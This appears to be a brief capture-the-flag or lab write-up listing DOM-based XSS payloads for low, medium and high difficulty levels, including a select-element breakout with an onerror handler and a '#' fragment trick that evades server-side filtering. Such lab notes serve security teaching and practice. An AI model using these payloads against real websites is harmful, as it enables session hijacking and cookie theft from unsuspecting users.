# XSS (DOM)

## low

```
<script>document.write(document.cookie)</script>
```

## medium

```
</option></select><img src="" onerror="javascript:document.write(document.cookie)">
```

## high

truncate php _GET with '#'

```
English#<script>document.write(document.cookie)</script>
```
